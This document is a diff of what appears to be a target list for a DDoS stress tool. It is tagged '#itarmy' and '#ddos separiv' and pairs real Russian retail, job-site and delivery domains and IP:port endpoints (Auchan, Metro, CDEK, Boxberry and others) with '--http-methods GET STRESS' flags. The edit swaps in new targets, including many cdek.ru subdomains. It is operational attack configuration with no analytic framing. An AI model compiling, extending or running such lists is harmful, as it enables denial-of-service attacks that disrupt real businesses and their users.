@@ -1,25 +1,17 @@
 #zhnec
 
-https://www.auchan.ru https://auchan.ru --http-methods GET STRESS
-tcp://46.243.184.43:443 tcp://46.243.184.47:443 tcp://46.243.184.45:443 tcp://194.84.13.19:443
+https://www.auchan.ru tcp://46.243.184.45:443 tcp://194.84.13.19:443 --http-methods GET STRESS
+https://auchan.ru tcp://46.243.184.43:443 tcp://46.243.184.47:443 --http-methods GET STRESS
 
 #itarmy
-
-#https://rest-domains.hh.ru http://rest-domains.hh.ru --http-methods GET STRESS 
-#https://hh.ru http://hh.ru --http-methods GET STRESS
-#https://rabota.vk.com http://rabota.vk.com --http-methods GET STRESS
-#https://fut.ru https://api.unilever.fut.ru --http-methods GET STRESS
-
-#https://www.avito.ru https://m.avito.ru --http-methods GET STRESS
-#https://avito.ru https://jobs.projects.avito.ru --http-methods GET STRESS
 
 
 
 
 #ddos separiv
-https://www.metro-cc.ru https://www.auchan.ru https://sportmaster.ru --http-methods GET STRESS
-https://leroymerlin.ru https://eldorado.ru http://185.169.155.178:80 --http-methods GET STRESS
-https://185.169.155.178:443 https://46.243.184.43:443 http://46.243.184.43:9121 --http-methods GET STRESS 
-https://46.243.184.47:443 https://46.243.184.47:9000 http://45.90.216.164:80 --http-methods GET STRESS
-https://45.90.216.164:443 http://93.174.54.138:8080 http://93.174.54.138:9000 --http-methods GET STRESS
-http://81.177.25.95:81 http://81.177.25.95:82 https://81.177.25.95:443 --http-methods GET STRESS
+https://www.cdek.ru https://api.cdek.ru https://global.cdek.ru --http-methods GET STRESS
+https://mx12.cdek.ru http://pokupkiusa.cdek.ru https://pokupkiusa.cdek.ru --http-methods GET STRESS
+https://pokupkiusa.track24.ru/ http://login.izusa.cdek.ru https://fivepost.ru --http-methods GET STRESS
+https://boxberry.ru https://www.cse.ru http://178.248.238.208:80 --http-methods GET STRESS
+http://193.232.108.86:80 https://193.107.237.86:443 https://185.65.22.9:443 --http-methods GET STRESS
+http://194.49.120.60:80 https://194.49.120.60:443 tcp://178.248.232.188:80 tcp://178.248.232.188:443 --http-methods GET STRESS
